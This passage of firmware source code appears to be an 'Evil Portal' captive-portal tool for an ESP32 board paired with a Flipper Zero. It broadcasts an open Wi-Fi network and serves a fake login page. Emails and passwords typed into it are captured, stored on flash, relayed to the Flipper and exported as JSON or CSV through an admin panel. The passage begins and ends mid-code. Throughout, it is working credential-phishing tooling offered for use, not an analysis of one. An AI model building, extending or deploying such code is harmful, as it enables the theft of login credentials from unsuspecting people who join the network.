            if (confirm('Reset portal HTML to default template?')) {
                fetch('/api/v1/portal-html', {
                    method: 'DELETE',
                    credentials: 'include'
                }).then(r => r.json()).then(data => {
                    if (data.success) {
                        showSuccess('Reset to default template.');
                        loadCurrentHtml();
                        loadTemplates();
                    }
                });
            }
        }
        
        function saveAsTemplate() {
            var name = document.getElementById('newTemplateName').value.trim();
            if (!name) {
                alert('Please enter a template name');
                return;
            }
            var html = document.getElementById('htmlEditor').value;
            fetch('/api/v1/templates', {
                method: 'POST',
                credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name: name, html: html })
            }).then(r => r.json()).then(data => {
                if (data.success) {
                    showSuccess('Template "' + name + '" saved!');
                    document.getElementById('newTemplateName').value = '';
                    loadTemplates();
                } else {
                    alert('Error: ' + (data.error || 'Unknown error'));
                }
            });
        }
        
        loadTemplates();
        loadCurrentHtml();
    </script>
</body>
</html>
)rawliteral";

// ============================================================================
// ADMIN PANEL HTML - EXPORT
// ============================================================================

const char admin_export_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Evil Portal - Export</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #e2e8f0; min-height: 100vh; }
        .navbar { background: #1e293b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
        .navbar h1 { font-size: 18px; color: #f8fafc; }
        .navbar h1 span { color: #ef4444; }
        .nav-links { display: flex; gap: 15px; }
        .nav-links a { color: #94a3b8; text-decoration: none; font-size: 14px; padding: 8px 12px; border-radius: 6px; transition: all 0.2s; }
        .nav-links a:hover, .nav-links a.active { background: #334155; color: #f8fafc; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        .card { background: #1e293b; border-radius: 12px; border: 1px solid #334155; margin-bottom: 20px; }
        .card-header { padding: 15px 20px; border-bottom: 1px solid #334155; }
        .card-header h2 { font-size: 16px; color: #f8fafc; }
        .card-body { padding: 20px; }
        .export-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
        .export-btn { display: flex; flex-direction: column; align-items: center; padding: 30px; background: #0f172a; border: 2px solid #334155; border-radius: 12px; cursor: pointer; transition: all 0.2s; text-decoration: none; color: #e2e8f0; }
        .export-btn:hover { border-color: #3b82f6; background: #1e3a5f; }
        .export-btn svg { width: 48px; height: 48px; margin-bottom: 15px; stroke: #3b82f6; }
        .export-btn h3 { font-size: 16px; margin-bottom: 5px; }
        .export-btn p { font-size: 12px; color: #64748b; }
    </style>
</head>
<body>
    <nav class="navbar">
        <h1>🎭 <span>Evil</span>Portal Studio</h1>
        <div class="nav-links">
            <a href="/admin">Dashboard</a>
            <a href="/admin/logs">Logs</a>
            <a href="/admin/config">Config</a>
            <a href="/admin/templates">Templates</a>
            <a href="/admin/export" class="active">Export</a>
            <a href="/admin/logout">Logout</a>
        </div>
    </nav>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <h2>Export Credentials</h2>
            </div>
            <div class="card-body">
                <div class="export-grid">
                    <a href="/api/v1/export/json" class="export-btn">
                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
                        <h3>JSON Format</h3>
                        <p>Structured data for APIs</p>
                    </a>
                    <a href="/api/v1/export/csv" class="export-btn">
                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><line x1="10" y1="9" x2="8" y2="9"/></svg>
                        <h3>CSV Format</h3>
                        <p>Open in Excel or Google Sheets</p>
                    </a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
)rawliteral";

// ============================================================================
// FORWARD DECLARATIONS
// ============================================================================

void loadConfig();
void saveConfig();
void loadCredentialCount();
bool checkAuth(AsyncWebServerRequest *request);
void sendToFlipper(const char* message);
void notifyFlipperSSIDChange(const char* newSSID);
void notifyFlipperHtmlChange();

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

String getActiveSSID() {
    return activeSSID;
}

const char* getActiveHtml() {
    if (hasCustomHtml && strlen(activeHtml) > 0) {
        return activeHtml;
    }
    return portal_html;
}

String getHtmlSourceName() {
    switch (lastChangeSource) {
        case SOURCE_WEB: return "Web Admin";
        case SOURCE_FLIPPER: return "Flipper Zero";
        default: return "Default";
    }
}

bool isDefaultCredentials() {
    return (adminUser == DEFAULT_ADMIN_USER && adminPass == DEFAULT_ADMIN_PASS);
}

bool isFlipperConnected() {
    return (millis() - lastFlipperActivity) < FLIPPER_TIMEOUT;
}

// ============================================================================
// LED FUNCTIONS
// ============================================================================

void setupLED() {
    if (LED_ACCENT_PIN >= 0) { pinMode(LED_ACCENT_PIN, OUTPUT); digitalWrite(LED_ACCENT_PIN, HIGH); }
    if (LED_STATUS_PIN >= 0) { pinMode(LED_STATUS_PIN, OUTPUT); digitalWrite(LED_STATUS_PIN, HIGH); }
    if (LED_ALERT_PIN >= 0) { pinMode(LED_ALERT_PIN, OUTPUT); digitalWrite(LED_ALERT_PIN, HIGH); }
}

void setLED(bool accent, bool status, bool alert) {
    if (LED_ACCENT_PIN >= 0) digitalWrite(LED_ACCENT_PIN, accent ? LOW : HIGH);
    if (LED_STATUS_PIN >= 0) digitalWrite(LED_STATUS_PIN, status ? LOW : HIGH);
    if (LED_ALERT_PIN >= 0) digitalWrite(LED_ALERT_PIN, alert ? LOW : HIGH);
}

void ledStarting() { setLED(true, false, false); }
void ledReady()    { setLED(false, true, false); }
void ledCapture()  { setLED(false, false, true); }

void blinkAlert(int times) {
    for (int i = 0; i < times; i++) {
        ledCapture();
        delay(200);
        ledReady();
        delay(200);
    }
}

// ============================================================================
// FLIPPER COMMUNICATION
// ============================================================================

void sendToFlipper(const char* message) {
    FlipperSerial.println(message);
    FlipperSerial.flush();
    delay(10);
    DebugSerial.print("[→FLIP] ");
    DebugSerial.println(message);
}

void sendCredentialsToFlipper(String email, String pass) {
    FlipperSerial.print("u: ");
    FlipperSerial.println(email);
    FlipperSerial.flush();
    delay(5);
    FlipperSerial.print("p: ");
    FlipperSerial.println(pass);
    FlipperSerial.flush();
    delay(5);
    DebugSerial.println("[→FLIP] Credentials sent to Flipper");
}

// Notify Flipper of SSID change from web
void notifyFlipperSSIDChange(const char* newSSID) {
    if (isFlipperConnected()) {
        String msg = "ssid_changed: ";
        msg += newSSID;
        sendToFlipper(msg.c_str());
    }
}

// Notify Flipper of HTML change from web
void notifyFlipperHtmlChange() {
    if (isFlipperConnected()) {
        sendToFlipper("html_changed");
    }
}

// ============================================================================
// SPIFFS FUNCTIONS
// ============================================================================

bool initSPIFFS() {
    DebugSerial.println("[*] Initializing SPIFFS...");
    
    if (SPIFFS.begin(false)) {
        DebugSerial.println("[+] SPIFFS mounted successfully");
        spiffsAvailable = true;
    } else {
        DebugSerial.println("[*] SPIFFS not mounted, attempting format...");
        if (SPIFFS.format()) {
            if (SPIFFS.begin(false)) {
                DebugSerial.println("[+] SPIFFS mounted after format");
                spiffsAvailable = true;
            }
        }
    }
    
    if (!spiffsAvailable) {
        DebugSerial.println("[!] SPIFFS unavailable - credentials will NOT persist!");
        return false;
    }
    
    loadConfig();
    loadCredentialCount();
    loadActiveHtml();
    return true;
}

void loadConfig() {
    if (!spiffsAvailable) return;
    
    File file = SPIFFS.open("/config.json", "r");
    if (!file) {
        DebugSerial.println("[*] No config file, using defaults");
        return;
    }
    
    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();
    
    if (error) {
        DebugSerial.println("[!] Config parse error");
        return;
    }
    
    if (doc["ssid"].is<const char*>()) {
        portalSSID = doc["ssid"].as<String>();
        activeSSID = portalSSID;
    }
    if (doc["admin_user"].is<const char*>()) adminUser = doc["admin_user"].as<String>();
    if (doc["admin_pass"].is<const char*>()) adminPass = doc["admin_pass"].as<String>();
    
    DebugSerial.println("[+] Config loaded from SPIFFS");
}

void saveConfig() {
    if (!spiffsAvailable) return;
    
    JsonDocument doc;
    doc["ssid"] = portalSSID;
    doc["admin_user"] = adminUser;
    doc["admin_pass"] = adminPass;
    
    File file = SPIFFS.open("/config.json", "w");
    if (file) {
        serializeJson(doc, file);
        file.close();
        DebugSerial.println("[+] Config saved to SPIFFS");
    }
}

void loadActiveHtml() {
    if (!spiffsAvailable) return;
    
    File file = SPIFFS.open("/active_html.html", "r");
    if (!file) {
        DebugSerial.println("[*] No custom HTML, using default");
        hasCustomHtml = false;
        return;
    }
    
    size_t size = file.size();
    if (size > MAX_HTML_SIZE - 1) {
        DebugSerial.println("[!] Custom HTML too large");
        file.close();
        return;
    }
    
    file.readBytes(activeHtml, size);
    activeHtml[size] = '\0';
    file.close();
    
    hasCustomHtml = true;
    lastChangeSource = SOURCE_WEB;
    DebugSerial.print("[+] Custom HTML loaded: ");
    DebugSerial.print(size);
    DebugSerial.println(" bytes");
}

void saveActiveHtml() {
    if (!spiffsAvailable) return;
    
    File file = SPIFFS.open("/active_html.html", "w");
    if (file) {
        file.print(activeHtml);
        file.close();
        DebugSerial.println("[+] Custom HTML saved to SPIFFS");
    }
}

void deleteActiveHtml() {
    if (!spiffsAvailable) return;
    SPIFFS.remove("/active_html.html");
    memset(activeHtml, 0, MAX_HTML_SIZE);
    hasCustomHtml = false;
    lastChangeSource = SOURCE_STANDALONE;
    DebugSerial.println("[+] Custom HTML deleted, using default");
}

// ============================================================================
// TEMPLATE MANAGEMENT
// ============================================================================

bool saveTemplate(const char* name, const char* html) {
    if (!spiffsAvailable) return false;
    
    String path = "/templates/";
    path += name;
    path += ".html";
    
    // Create templates directory if needed
    if (!SPIFFS.exists("/templates")) {
        // SPIFFS doesn't really have directories, files with / work
    }
    
    File file = SPIFFS.open(path, "w");
    if (!file) return false;
    
    file.print(html);
    file.close();
    return true;
}

String loadTemplate(const char* name) {
    if (!spiffsAvailable) return "";
    
    String path = "/templates/";
    path += name;
    path += ".html";
    
    File file = SPIFFS.open(path, "r");
    if (!file) return "";
    
    String content = file.readString();
    file.close();
    return content;
}

bool deleteTemplate(const char* name) {
    if (!spiffsAvailable) return false;
    
    String path = "/templates/";
    path += name;
    path += ".html";
    
    return SPIFFS.remove(path);
}

// ============================================================================
// CREDENTIAL MANAGEMENT
// ============================================================================

void loadCredentialCount() {
    if (!spiffsAvailable) return;
    
    File file = SPIFFS.open("/cred_meta.json", "r");
    if (!file) return;
    
    JsonDocument doc;
    if (!deserializeJson(doc, file)) {
        totalCaptures = doc["count"] | 0;
        nextCredentialId = doc["next_id"] | 1;
    }
    file.close();
}

void saveCredentialMeta() {
    if (!spiffsAvailable) return;
    
    JsonDocument doc;
    doc["count"] = totalCaptures;
    doc["next_id"] = nextCredentialId;
    
    File file = SPIFFS.open("/cred_meta.json", "w");
    if (file) {
        serializeJson(doc, file);
        file.close();
    }
}

void saveCredential(String email, String password, String ip, bool flipperMode) {
    totalCaptures++;
    int id = nextCredentialId++;
    saveCredentialMeta();
    
    if (!spiffsAvailable) return;
    
    JsonDocument doc;
    doc["id"] = id;
    doc["email"] = email;
    doc["password"] = password;
    doc["ip"] = ip;
    doc["flipper_mode"] = flipperMode;
    doc["timestamp"] = millis() / 1000;
    
    String filename = "/creds/";
    filename += id;
    filename += ".json";
    
    File file = SPIFFS.open(filename, "w");
    if (file) {
        serializeJson(doc, file);
        file.close();
    }
    
    // Send to Flipper if connected
    if (isFlipperConnected()) {
        sendCredentialsToFlipper(email, password);
    }
}

String getAllCredentialsJson() {
    JsonDocument doc;
    JsonArray arr = doc["credentials"].to<JsonArray>();
    
    if (spiffsAvailable) {
        File root = SPIFFS.open("/creds");
        if (root && root.isDirectory()) {
            File file = root.openNextFile();
            while (file) {
                if (!file.isDirectory()) {
                    JsonDocument credDoc;
                    if (!deserializeJson(credDoc, file)) {
                        JsonObject obj = arr.add<JsonObject>();
                        obj["id"] = credDoc["id"];
                        obj["email"] = credDoc["email"];
                        obj["password"] = credDoc["password"];
                        obj["ip"] = credDoc["ip"];
                        obj["flipper_mode"] = credDoc["flipper_mode"];
                        obj["timestamp"] = credDoc["timestamp"];
                    }
                }
                file = root.openNextFile();
            }
        }
    }
    
    doc["total"] = totalCaptures;
    String result;
    serializeJson(doc, result);
    return result;
}

bool deleteCredential(int id) {
    if (!spiffsAvailable) return false;
    
    String filename = "/creds/";
    filename += id;
    filename += ".json";
    
    if (SPIFFS.exists(filename)) {
        SPIFFS.remove(filename);
        totalCaptures = max(0, totalCaptures - 1);
        saveCredentialMeta();
        return true;
    }
    return false;
}

void clearAllLogs() {
    if (!spiffsAvailable) return;
    
    File root = SPIFFS.open("/creds");
    if (root && root.isDirectory()) {
        File file = root.openNextFile();
        while (file) {
            String path = file.path();
            file.close();
            SPIFFS.remove(path);
            file = root.openNextFile();
        }
    }
    
    totalCaptures = 0;
    nextCredentialId = 1;
    saveCredentialMeta();
}

// ============================================================================
// AUTHENTICATION
// ============================================================================

bool checkAuth(AsyncWebServerRequest *request) {
    if (!request->authenticate(adminUser.c_str(), adminPass.c_str())) {
        return false;
    }
    return true;
}

// ============================================================================
// WIFI CONTROL - DYNAMIC SSID CHANGE
// ============================================================================

bool changeSSID(const char* newSSID, ChangeSource source) {
    if (strlen(newSSID) == 0 || strlen(newSSID) > 32) {
        return false;
    }
    
    DebugSerial.print("[SSID] Changing to: ");
    DebugSerial.print(newSSID);
    DebugSerial.print(" (source: ");
    DebugSerial.print(source == SOURCE_WEB ? "Web" : (source == SOURCE_FLIPPER ? "Flipper" : "Standalone"));
    DebugSerial.println(")");
    
    // Update active SSID
    activeSSID = String(newSSID);
    lastChangeSource = source;
    
    // Apply immediately without restart
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    delay(100);
    WiFi.softAP(newSSID, "");
    delay(200);
    
    DebugSerial.print("[SSID] Now active: ");
    DebugSerial.println(WiFi.softAPSSID());
    
    // Save to SPIFFS for persistence
    portalSSID = activeSSID;
    saveConfig();
    
    // Notify Flipper if change came from web
    if (source == SOURCE_WEB) {
        notifyFlipperSSIDChange(newSSID);
    }
    
    return true;
}

bool changeHtml(const char* newHtml, ChangeSource source) {
    size_t len = strlen(newHtml);
    if (len == 0 || len >= MAX_HTML_SIZE) {
        return false;
    }
    
    DebugSerial.print("[HTML] Updating: ");
    DebugSerial.print(len);
    DebugSerial.println(" bytes");
    
    strncpy(activeHtml, newHtml, MAX_HTML_SIZE - 1);
    activeHtml[MAX_HTML_SIZE - 1] = '\0';
    hasCustomHtml = true;
    lastChangeSource = source;
    
    // Save to SPIFFS
    saveActiveHtml();
    
    // Notify Flipper if change came from web
    if (source == SOURCE_WEB) {
        notifyFlipperHtmlChange();
    }
    
    return true;
}

// ============================================================================
// FLIPPER COMMAND PROCESSING
// ============================================================================

void processFlipperLine(String line) {
    lastFlipperActivity = millis();
    flipperConnected = true;
    
    DebugSerial.print("[←FLIP] '");
    DebugSerial.print(line);
    DebugSerial.println("'");
    
    String trimmed = line;
    trimmed.trim();
    
    // Handle multi-line HTML reception
    if (receivingHtml) {
        htmlLineCount++;
        htmlBuffer += line + "\n";
        String lower = line;
        lower.toLowerCase();
        if (lower.indexOf("</html>") >= 0) {
            if (htmlBuffer.length() < MAX_HTML_SIZE) {
                changeHtml(htmlBuffer.c_str(), SOURCE_FLIPPER);
                sendToFlipper("html set");
            }
            htmlBuffer = "";
            receivingHtml = false;
            htmlLineCount = 0;
        }
        return;
    }
    
    // sethtml= command
    if (trimmed.startsWith("sethtml=")) {
        DebugSerial.println("[CMD] sethtml received");
        receivingHtml = true;
        htmlLineCount = 1;
        String content = trimmed.substring(8);
        htmlBuffer = content + "\n";
        String lower = content;
        lower.toLowerCase();
        if (lower.indexOf("</html>") >= 0) {
            changeHtml(htmlBuffer.c_str(), SOURCE_FLIPPER);
            sendToFlipper("html set");
            htmlBuffer = "";
            receivingHtml = false;
        }
        return;
    }
    
    // setap= command
    if (trimmed.startsWith("setap=")) {
        String ap = trimmed.substring(6);
        ap.trim();
        if (ap.length() > 0 && ap.length() <= 32) {
            changeSSID(ap.c_str(), SOURCE_FLIPPER);
            sendToFlipper("ap set");
            
            // Check if we have both AP and HTML
            if (hasCustomHtml) {
                sendToFlipper("all set");
                flipperPortalRunning = true;
            }
        }
        return;
    }
    
    // Simple commands
    if (trimmed.equalsIgnoreCase("start")) {
        DebugSerial.println("[CMD] start");
        flipperPortalRunning = true;
        sendToFlipper("portal running");
        return;
    }
    
    if (trimmed.equalsIgnoreCase("stop")) {
        DebugSerial.println("[CMD] stop");
        flipperPortalRunning = false;
        // Reset to standalone mode
        activeSSID = portalSSID;
        hasCustomHtml = false;
        memset(activeHtml, 0, MAX_HTML_SIZE);
        lastChangeSource = SOURCE_STANDALONE;
        WiFi.softAPdisconnect(true);
        delay(100);
        WiFi.softAPConfig(apIP, apIP, netMsk);
        WiFi.softAP(portalSSID.c_str(), "");
        sendToFlipper("portal stopped");
        return;
    }
    
    if (trimmed.equalsIgnoreCase("status")) {
        String status = "status: ssid=";
        status += activeSSID;
        status += ", captures=";
        status += totalCaptures;
        status += ", html=";
        status += (hasCustomHtml ? "custom" : "default");
        sendToFlipper(status.c_str());
        return;
    }
    
    if (trimmed.equalsIgnoreCase("reset")) {
        DebugSerial.println("[CMD] reset");
        delay(100);
        ESP.restart();
        return;
    }
    
    if (trimmed.equalsIgnoreCase("ack")) {
        return;
    }
}

// ============================================================================
// CAPTIVE PORTAL HANDLER
// ============================================================================

class CaptiveRequestHandler : public AsyncWebHandler {
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}
    
    bool canHandle(AsyncWebServerRequest *request) {
        String url = request->url();
        if (url.startsWith("/admin") || url.startsWith("/api") || 
            url.startsWith("/ping") || url.startsWith("/factory-reset")) {
            return false;
        }
        return true;
    }
    
    void handleRequest(AsyncWebServerRequest *request) {
        if (hasCustomHtml) {
            request->send_P(200, "text/html", activeHtml);
        } else {
            request->send_P(200, "text/html", portal_html);
        }
        
        if (isFlipperConnected()) {
            sendToFlipper("client connected");
        }
    }
};

// ============================================================================
// CREDENTIAL CAPTURE HANDLER
// ============================================================================

void handleCredentialCapture(AsyncWebServerRequest *request) {
    String email = "";
    String password = "";
    
    if (request->hasParam("email")) email = request->getParam("email")->value();
    else if (request->hasParam("username")) email = request->getParam("username")->value();
    if (request->hasParam("password")) password = request->getParam("password")->value();
    
    if (email.length() > 0 || password.length() > 0) {
        String clientIP = request->client()->remoteIP().toString();
        
        DebugSerial.println("\n╔══════════════════════════════════════╗");
        DebugSerial.println("║      CREDENTIALS CAPTURED!           ║");
        DebugSerial.println("╠══════════════════════════════════════╣");
        DebugSerial.print("║ Email:    "); DebugSerial.println(email);
        DebugSerial.print("║ Password: "); DebugSerial.println(password);
        DebugSerial.print("║ IP:       "); DebugSerial.println(clientIP);
        DebugSerial.print("║ Mode:     "); DebugSerial.println(isFlipperConnected() ? "Flipper" : "Standalone");
        DebugSerial.println("╚══════════════════════════════════════╝");
        
        saveCredential(email, password, clientIP, isFlipperConnected());
        blinkAlert(3);
    }
    
    // Return 1x1 transparent GIF
    const uint8_t gif[] = { 0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 
                            0x01, 0x00, 0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 
                            0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 
                            0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 
                            0x01, 0x44, 0x00, 0x3b };
    AsyncWebServerResponse *response = request->beginResponse_P(200, "image/gif", gif, sizeof(gif));
    request->send(response);
}

// ============================================================================
// API ROUTES
// ============================================================================

void setupAPIRoutes() {
    // Health check (no auth)
    server.on("/ping", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/plain", "pong");
    });
    
    // Factory reset (no auth)
    server.on("/factory-reset", HTTP_GET, [](AsyncWebServerRequest *request) {
        adminUser = DEFAULT_ADMIN_USER;
        adminPass = DEFAULT_ADMIN_PASS;
        portalSSID = DEFAULT_SSID;
        activeSSID = DEFAULT_SSID;
        saveConfig();
        clearAllLogs();
        deleteActiveHtml();
        
        request->send(200, "text/html", "<html><body style='background:#0f172a;color:#e2e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;'><div style='text-align:center;'><h1 style='color:#10b981;'>Factory Reset Complete</h1><p>Username: <code>admin</code><br>Password: <code>admin</code></p><a href='/admin' style='color:#3b82f6;'>Go to Admin</a></div></body></html>");
    });
    
    // Status
    server.on("/api/v1/status", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        
        JsonDocument doc;
        doc["version"] = FIRMWARE_VERSION;
        doc["uptime"] = millis() / 1000;
        doc["ssid"] = activeSSID;
        doc["ip"] = WiFi.softAPIP().toString();
        doc["credentials_count"] = totalCaptures;
        doc["memory_free"] = ESP.getFreeHeap();
        doc["spiffs_available"] = spiffsAvailable;
        doc["flipper_connected"] = isFlipperConnected();
        doc["has_custom_html"] = hasCustomHtml;
        doc["html_source"] = getHtmlSourceName();
        doc["default_creds"] = isDefaultCredentials();
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    // Dashboard
    server.on("/api/v1/dashboard", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->send(401, "application/json", "{\"error\":\"unauthorized\"}"); return; }
        
        JsonDocument doc;
        doc["version"] = FIRMWARE_VERSION;
        doc["uptime"] = millis() / 1000;
        doc["ssid"] = activeSSID;
        doc["ip"] = WiFi.softAPIP().toString();
        doc["credentials_count"] = totalCaptures;
        doc["memory_free"] = ESP.getFreeHeap();
        doc["spiffs_available"] = spiffsAvailable;
        doc["flipper_connected"] = isFlipperConnected();
        doc["html_source"] = getHtmlSourceName();
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    // Config GET
    server.on("/api/v1/config", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        
        JsonDocument doc;
        doc["ssid"] = portalSSID;
        doc["active_ssid"] = activeSSID;
        doc["admin_user"] = adminUser;
        doc["flipper_connected"] = isFlipperConnected();
        doc["has_custom_html"] = hasCustomHtml;
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    // ============================================================
    // NEW v1.3 API: Dynamic SSID Change
    // ============================================================
    server.on("/api/v1/ssid", HTTP_POST, [](AsyncWebServerRequest *request) {}, NULL,
        [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
            if (!checkAuth(request)) { request->requestAuthentication(); return; }
            
            static String body;
            if (index == 0) body = "";
            for (size_t i = 0; i < len; i++) body += (char)data[i];
            
            if (index + len == total) {
                JsonDocument doc;
                if (deserializeJson(doc, body)) {
                    request->send(400, "application/json", "{\"success\":false,\"error\":\"Invalid JSON\"}");
                    return;
                }
                
                if (!doc["ssid"].is<const char*>()) {
                    request->send(400, "application/json", "{\"success\":false,\"error\":\"Missing ssid field\"}");
                    return;
                }
                
                String newSSID = doc["ssid"].as<String>();
                if (changeSSID(newSSID.c_str(), SOURCE_WEB)) {
                    JsonDocument resp;
                    resp["success"] = true;
                    resp["new_ssid"] = activeSSID;
                    resp["message"] = "SSID changed immediately";
                    String response;
                    serializeJson(resp, response);
                    request->send(200, "application/json", response);
                } else {
                    request->send(400, "application/json", "{\"success\":false,\"error\":\"Invalid SSID\"}");
                }
            }
        }
    );
    
    // ============================================================
    // NEW v1.3 API: Portal HTML Management
    // ============================================================
    server.on("/api/v1/portal-html", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        
        JsonDocument doc;
        if (request->hasParam("default") && request->getParam("default")->value() == "true") {
            doc["html"] = portal_html;
            doc["source"] = "default";
        } else {
            doc["html"] = hasCustomHtml ? activeHtml : portal_html;
            doc["source"] = getHtmlSourceName();
            doc["is_custom"] = hasCustomHtml;
        }
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    server.on("/api/v1/portal-html", HTTP_DELETE, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        
        deleteActiveHtml();
        request->send(200, "application/json", "{\"success\":true,\"message\":\"Reset to default HTML\"}");
    });
    
    // ============================================================
    // NEW v1.3 API: Template Management
    // ============================================================
    server.on("/api/v1/templates", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        
        JsonDocument doc;
        JsonArray arr = doc["templates"].to<JsonArray>();
        
        if (spiffsAvailable) {
            File root = SPIFFS.open("/templates");
            if (root && root.isDirectory()) {
                File file = root.openNextFile();
                while (file) {
                    if (!file.isDirectory()) {
                        String name = file.name();
                        // Remove /templates/ prefix and .html suffix
                        if (name.startsWith("/templates/")) name = name.substring(11);
                        if (name.endsWith(".html")) name = name.substring(0, name.length() - 5);
                        
                        JsonObject obj = arr.add<JsonObject>();
                        obj["name"] = name;
                        obj["size"] = file.size();
                        obj["active"] = false; // Could compare with activeHtml
                    }
                    file = root.openNextFile();
                }
            }
        }
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    // Logs
    server.on("/api/v1/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        request->send(200, "application/json", getAllCredentialsJson());
    });
    
    server.on("/api/v1/logs", HTTP_DELETE, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        clearAllLogs();
        request->send(200, "application/json", "{\"success\":true}");
    });
    
    // Export
    server.on("/api/v1/export/json", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        AsyncWebServerResponse *response = request->beginResponse(200, "application/json", getAllCredentialsJson());
        response->addHeader("Content-Disposition", "attachment; filename=\"credentials.json\"");
        request->send(response);
    });
    
    server.on("/api/v1/export/csv", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        
        String csv = "id,email,password,ip,source,timestamp\n";
        
        if (spiffsAvailable) {
            File root = SPIFFS.open("/creds");
            if (root && root.isDirectory()) {
                File file = root.openNextFile();
                while (file) {
                    if (!file.isDirectory()) {
                        JsonDocument doc;
                        if (!deserializeJson(doc, file)) {
                            csv += String(doc["id"].as<int>()) + ",";
                            csv += "\"" + String(doc["email"].as<const char*>()) + "\",";
                            csv += "\"" + String(doc["password"].as<const char*>()) + "\",";
                            csv += String(doc["ip"].as<const char*>()) + ",";
                            csv += (doc["flipper_mode"].as<bool>() ? "flipper" : "standalone");
                            csv += "," + String(doc["timestamp"].as<unsigned long>()) + "\n";
                        }
                    }
                    file = root.openNextFile();
                }
            }
        }
        
        AsyncWebServerResponse *response = request->beginResponse(200, "text/csv", csv);
        response->addHeader("Content-Disposition", "attachment; filename=\"credentials.csv\"");
        request->send(response);
    });
    
    // Reboot
    server.on("/api/v1/reboot", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) { request->requestAuthentication(); return; }
        request->send(200, "application/json", "{\"success\":true}");
        delay(1000);
        ESP.restart();
    });
}

// Handler for DELETE /api/v1/logs/{id}
void handleDeleteLog(AsyncWebServerRequest *request) {
    if (!checkAuth(request)) { request->requestAuthentication(); return; }
    
    String url = request->url();
    int lastSlash = url.lastIndexOf('/');
    int id = url.substring(lastSlash + 1).toInt();
    
    if (deleteCredential(id)) {
        request->send(200, "application/json", "{\"success\":true}");
    } else {
        request->send(404, "application/json", "{\"error\":\"Not found\"}");
    }
}

// Handler for POST /api/v1/config (admin credentials update)
void handleConfigUpdate(AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
    if (!checkAuth(request)) { request->requestAuthentication(); return; }
    
    static String body;
    if (index == 0) body = "";
    for (size_t i = 0; i < len; i++) body += (char)data[i];
    
    if (index + len == total) {
        JsonDocument doc;
        if (deserializeJson(doc, body)) {
            request->send(400, "application/json", "{\"error\":\"Invalid JSON\"}");
            return;
        }
        
        bool updated = false;
        
        if (doc["admin_user"].is<const char*>()) {
            String newUser = doc["admin_user"].as<String>();
            if (newUser.length() > 0) {
                adminUser = newUser;
                updated = true;
            }
        }
        
        if (doc["admin_pass"].is<const char*>()) {
            String newPass = doc["admin_pass"].as<String>();
            if (newPass.length() > 0) {
                adminPass = newPass;
                updated = true;
            }
        }
        
        if (updated) {
            saveConfig();
        }
        
        request->send(200, "application/json", "{\"success\":true}");
    }
}

// Handler for POST /api/v1/portal-html
void handleHtmlUpdate(AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
    if (!checkAuth(request)) { request->requestAuthentication(); return; }
    
    static String body;
    if (index == 0) body = "";
    for (size_t i = 0; i < len; i++) body += (char)data[i];
    
    if (index + len == total) {
        JsonDocument doc;
        if (deserializeJson(doc, body)) {
            request->send(400, "application/json", "{\"success\":false,\"error\":\"Invalid JSON\"}");
